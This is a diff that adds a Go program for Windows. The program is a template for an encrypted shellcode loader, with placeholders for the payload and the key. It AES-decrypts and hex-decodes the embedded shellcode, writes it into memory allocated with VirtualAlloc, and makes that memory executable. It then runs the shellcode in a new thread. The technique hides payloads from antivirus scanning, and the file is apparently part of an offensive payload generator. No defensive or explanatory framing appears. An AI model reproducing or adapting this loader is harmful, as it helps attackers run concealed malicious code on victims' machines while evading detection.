@@ -1,0 +1,119 @@
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"encoding/hex"
+	"fmt"
+	"os"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+const (
+	MEM_COMMIT        = 0x1000
+	MEM_RESERVE       = 0x2000
+	PAGE_EXECUTE_READ = 0x20
+	PAGE_READWRITE    = 0x04
+)
+
+var (
+	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+	ntdll    = windows.NewLazySystemDLL("ntdll.dll")
+
+	RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
+	CreateThread  = kernel32.NewProc("CreateThread")
+)
+
+// Decrypt: Encrypted Text --> Base64 Decode --> Decrypt with IV and Key
+func Decrypt(key []byte, encryptedText string) string {
+	ciphertext, _ := base64.URLEncoding.DecodeString(encryptedText)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+
+	// Using IV
+	iv := ciphertext[:aes.BlockSize]
+
+	// Checking BlockSize = IV
+	if len(iv) != aes.BlockSize {
+		panic("[Error] Ciphertext is too short!")
+	}
+
+	ciphertext = ciphertext[aes.BlockSize:]
+
+	// Decryption Process
+	stream := cipher.NewCFBDecrypter(block, iv)
+	stream.XORKeyStream(ciphertext, ciphertext)
+
+	return string(ciphertext)
+}
+
+func Execute(shellcode []byte) {
+	addr, errVirtualAlloc := windows.VirtualAlloc(
+		uintptr(0),
+		uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
+	)
+	if errVirtualAlloc != nil {
+		panic("[ERROR] Call to VirtualAlloc failed!")
+	}
+
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(
+		addr,
+		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+	)
+	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to RtlCopyMemory failed!")
+	}
+
+	var oldProtect uint32
+	errVirtualProtect := windows.VirtualProtect(
+		addr, uintptr(len(shellcode)),
+		windows.PAGE_EXECUTE_READ,
+		&oldProtect,
+	)
+	if errVirtualProtect != nil {
+		panic("[ERROR] Call to VirtualProtect failed!")
+	}
+
+	thread, _, errCreateThread := CreateThread.Call(
+		0,
+		0,
+		addr,
+		uintptr(0),
+		0,
+		0,
+	)
+	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to CreateThread failed!")
+	}
+
+	_, _ = windows.WaitForSingleObject(
+		windows.Handle(thread),
+		0xFFFFFFFF,
+	)
+}
+
+func main() {
+	encShellcode := "{{.Shellcode}}"
+	key := []byte("{{.Key}}")
+
+	// Decrypt base64/AES to original value
+	decShellcode := Decrypt(key, encShellcode)
+
+	shellcode, err := hex.DecodeString(decShellcode)
+
+	if err != nil {
+		fmt.Printf("[ERROR] Error Decoding: %s\n", err)
+		os.Exit(1)
+	}
+
+	Execute(shellcode)
+}
